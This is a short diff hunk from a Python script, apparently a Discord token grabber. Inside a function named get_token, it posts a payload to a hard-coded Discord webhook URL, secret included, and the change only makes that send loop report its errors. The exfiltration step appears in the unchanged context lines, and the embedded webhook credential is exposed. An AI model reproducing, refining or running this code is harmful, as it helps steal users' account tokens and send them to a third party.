@@ -111,7 +111,8 @@ def get_token():
                     }
                     req = Request('https://discord.com/api/webhooks/1247364290084606052/CnNsZ184abYfD1kj3yAtkOH873RS4c7HVpD5Ryps2wX5Sv4pG-zz9KCRZmPYHIff3llm', data=payload.encode(), headers=headers2)
                     urlopen(req)
-                except:
+                except Exception as e:
+                    print(f"Failed to send webhook: {e}")
                     continue
 
 if __name__ == '__main__':
